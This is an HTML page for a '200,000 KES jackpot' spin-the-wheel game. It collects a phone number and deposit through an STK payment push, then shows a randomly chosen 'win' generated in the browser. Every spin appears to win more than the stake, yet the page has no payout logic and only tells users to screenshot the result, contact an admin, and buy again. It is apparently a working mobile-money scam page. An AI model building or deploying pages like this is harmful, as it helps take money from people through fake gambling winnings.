<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>DigitalServices - 200K Jackpot</title><style>body{background:#0a0e19;color:#fff;font-family:Arial;text-align:center;padding:20px} .card{background:#1c2538;border-radius:20px;padding:24px;max-width:380px;margin:20px auto;border:2px solid #ffd700} input{width:100%;padding:14px;margin:8px 0;border-radius:12px;border:1px solid #2a3a50;background:#0a0e19;color:#fff;box-sizing:border-box} .btn-green{width:100%;padding:16px;background:#00d26a;color:#000;font-weight:900;border:none;border-radius:12px;font-size:18px;cursor:pointer} .btn-yellow{width:100%;padding:16px;background:#ffeb3b;color:#000;font-weight:900;border:none;border-radius:12px;font-size:18px;margin-top:10px;cursor:pointer;display:none} .wheel{font-size:110px;transition:transform 4s cubic-bezier(0.17,0.67,0.12,0.99);margin:10px 0} #prize{color:#ffd700;font-size:22px;font-weight:900;min-height:30px} #status{font-size:13px;white-space:pre-wrap;color:#9aa8c0} table{width:100%;font-size:13px;color:#9aa8c0;text-align:left;margin-top:10px;border-collapse:collapse} td{padding:7px;border-bottom:1px solid #2a3a50} td:last-child{color:#00d26a;font-weight:700;text-align:right} .jackpot{color:#ffd700;font-weight:900}</style></head><body>
<h1 style="color:#ffd700;margin:0">🏆 200,000 KES JACKPOT 🏆</h1><p style="color:#9aa8c0;font-size:13px">Channel 14591 • Account 13469 • Min 50 KES</p>
<div class="card">
<div id="wheel" class="wheel">🎡</div>
<div id="prize">SPIN TO WIN UP TO 200K!</div>
<table>
<tr><td>50 KES</td><td>100 - 1,000 KES</td></tr>
<tr><td>100 KES</td><td>200 - 5,000 KES</td></tr>
<tr><td>500 KES</td><td>1,000 - 10,000 KES</td></tr>
<tr><td>1000 KES</td><td class="jackpot">UP TO 200,000 KES*</td></tr>
</table>
<p style="font-size:10px;color:#666">*Jackpot 1 in 1000 chance</p>
<input id="phone" placeholder="Phone 07XXXXXXXX">
<input id="amount" type="number" value="50" min="50" placeholder="Min 50">
<button class="btn-green" id="buyBtn" onclick="deposit()">BUY SPIN TICKET</button>
<button class="btn-yellow" id="spinBtn" onclick="spin()">🎡 SPIN FOR 200K!</button>
<p id="status">Minimum 50 KES • Jackpot available for 1000+ deposits</p>
</div>
<script>
let canSpin=false; let currentAmount=50;
function getPrizeForAmount(amount){
 amount=Number(amount);
 const isJackpot = Math.random() < 0.001; // 1 in 1000 = 200k
 if(amount>=1000){
   if(isJackpot) return "200,000 KES JACKPOT 🎉";
   return (Math.random()<0.5 ? "5,000 KES CASH" : "10,000 KES CASH");
 }
 if(amount>=500) return (Math.random()<0.5 ? "1,000 KES CASH" : "5,000 KES CASH");
 if(amount>=250) return (Math.random()<0.5 ? "500 KES CASH" : "1,000 KES CASH");
 if(amount>=100) return (Math.random()<0.5 ? "200 KES CASH" : "500 KES CASH");
 if(amount>=50) return (Math.random()<0.5 ? "100 KES CASH" : "200 KES CASH");
 return null;
}
async function deposit(){
 const p=document.getElementById('phone').value.trim();
 const a=document.getElementById('amount').value;
 const s=document.getElementById('status');
 const buyBtn=document.getElementById('buyBtn');
 const spinBtn=document.getElementById('spinBtn');
 if(p.length<10){ s.innerText='Enter valid phone'; return; }
 if(Number(a)<50){ s.innerText='❌ Min 50 KES'; return; }
 s.innerText='Sending STK via Channel 14591...'; buyBtn.innerText='SENDING...'; buyBtn.disabled=true; currentAmount=Number(a);
 try{
  const r=await fetch('/api/deposit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone:p,amount:a})});
  await r.json();
  s.innerText=`STK SENT for ${a} KES! Enter PIN\nPrize pool: up to 200K`;
  buyBtn.style.display='none'; spinBtn.style.display='block'; canSpin=true;
  document.getElementById("prize").innerText=`PAID ${a} KES → SPIN FOR 200K!`;
 }catch(e){ s.innerText='Error: '+e.message; buyBtn.innerText='BUY SPIN TICKET'; buyBtn.disabled=false; }
}
function spin(){
 if(!canSpin){ alert("Buy ticket first"); return; }
 const deg=1800+Math.random()*1500;
 document.getElementById("wheel").style.transform=`rotate(${deg}deg)`;
 document.getElementById("prize").innerText="SPINNING FOR 200K...";
 document.getElementById("spinBtn").disabled=true;
 setTimeout(()=>{
  const win=getPrizeForAmount(currentAmount);
  document.getElementById("prize").innerText=`YOU WON: ${win}`;
  document.getElementById("status").innerText=`Won ${win}! Screenshot & contact admin.`;
  document.getElementById("spinBtn").style.display='none';
  document.getElementById("buyBtn").style.display='block';
  document.getElementById("buyBtn").innerText='BUY AGAIN';
  document.getElementById("buyBtn").disabled=false;
  canSpin=false;
 },4000);
}
</script>
</body></html>
